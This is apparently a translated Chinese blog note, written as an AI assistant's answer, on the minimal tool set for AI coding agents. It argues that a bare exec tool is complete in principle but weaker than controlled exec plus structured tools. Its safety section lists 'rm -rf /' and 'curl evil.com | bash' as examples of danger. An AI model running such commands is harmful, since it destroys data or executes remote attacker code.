---
audio: false
generated: true
image: false
lang: zh
layout: post
title: AI 编码代理的最小工具
translated: true
type: note
---

**问题：**
在像 Claude Code、Codex、AMP Code 或 OpenCode 这样的系统中，需要的最小工具调用集是什么？单个 `exec` 命令是否足够，因为它理论上可以处理一切（read/edit/git 等）？

---

**回答：**

简短回答：**是的，原则上一个 `exec` 工具就够了——但在实践中，这不是一个好的设计。**

让我们从系统和代理设计角度来分解这个问题。

---

# 1. 理论最小值：一个 `exec` 工具

你的核心想法完全正确：

> 如果 LLM 可以运行任意 shell 命令，它几乎可以做任何事。

只需：

```
exec(command: string)
```

你就可以：

### 文件操作

```bash
cat file.txt
echo "new content" > file.txt
```

### 代码编辑

```bash
sed -i 's/foo/bar/g' app.js
```

### Git

```bash
git status
git commit -am "fix"
git push
```

### 自定义工具

```bash
./my_cli_tool --analyze
```

### 甚至动态创建新工具

```bash
echo 'python script' > tool.py
python tool.py
```

所以是的：

> **`exec` 在功能上是完整的（Turing-complete 接口）。**

---

# 2. 为什么真实系统不只使用 `exec`

像以下系统：

* Claude Code
* Codex
* AMP Code
* OpenCode

**不会仅依赖原始 `exec`**，尽管它们可以。

### 原因 1：安全性 / 破坏范围

`exec` 可以做危险的事：

```bash
rm -rf /
curl evil.com | bash
```

因此生产系统需要：

* 沙箱化
* 权限控制
* 范围能力

这就是为什么它们引入结构化工具，如：

* `read_file`
* `write_file`
* `run_tests`
* `git_commit`

---

### 原因 2：可观察性和控制

使用 `exec`，一切都变得不透明：

不好：

```
exec("some complex bash script")
```

更好：

```
read_file("app.js")
edit_file(...)
run_tests()
```

好处：

* 更容易调试
* 更好的日志记录
* 确定性行为
* 细粒度重试

---

### 原因 3：LLM 可靠性

LLM **不是完美的 shell 程序员**。

纯 `exec` 的问题：

* 脆弱的 bash 语法
* 引号问题
* 环境差异
* 难以解析输出

结构化工具：

* 减少歧义
* 约束行为
* 提高成功率

---

### 原因 4：令牌效率

比较：

#### 使用 `exec`

```
exec("grep -r 'foo' . | awk ... | sed ...")
```

#### 使用工具

```
search_code("foo")
```

结构化工具：

* 更短的提示
* 更少的推理开销
* 更低的令牌成本

---

### 原因 5：安全模型

现代代理系统使用：

* 允许列表
* 基于能力的访问

示例：

```
Agent A → 只读
Agent B → 可以写文件
Agent C → 可以部署
```

使用原始 `exec` 无法干净地强制执行。

---

# 3. 实际最小集（实用）

在实践中，大多数系统收敛到类似以下内容：

### 核心工具

1. `read_file`
2. `write_file` / `edit_file`
3. `list_files`
4. `run_command`（受控 exec）
5. `search`

可选：

* `git_*` 工具
* `test_runner`
* `linter`

---

# 4. 混合设计（你的建议）

你的想法实际上**非常强大，并在高级系统中使用**：

> “定义最小 exec + 允许自定义 CLI 工具”

这会导致：

### 分层架构

#### 第 1 层：基本层

```
exec
```

#### 第 2 层：用户定义的 CLI 工具

```
mytool analyze
mytool refactor
mytool test
```

#### 第 3 层：LLM 编排

这正是：

* Codex 高级用户的工作方式
* 内部开发工具的演进
* Unix 哲学的应用

---

# 5. 关键洞见

权衡是：

| 方法           | 能力   | 安全性 | 可靠性 | 简单性 |
| -------------- | ------ | ------ | ------- | ------ |
| 仅 `exec`      | ★★★★★ | ★      | ★★      | ★★★★★  |
| 结构化 API     | ★★★★   | ★★★★★  | ★★★★★   | ★★★    |
| 混合           | ★★★★★ | ★★★★   | ★★★★    | ★★★★   |

---

# 6. 最终观点

你的直觉在深层上是正确的：

> **`exec` 是终极基本元素——其他一切都是抽象。**

但是：

> **好的代理系统不是关于最小能力，而是受控能力。**

因此最好的现实世界设计是：

```
controlled_exec + 结构化工具 + 可选 CLI 扩展
```

---

如果你想，我可以帮你设计一个**最小但生产级的代理工具系统**（像简化的 Codex），包括：

* 权限模型
* 工具 schema
* CLI 可扩展性
* 沙箱策略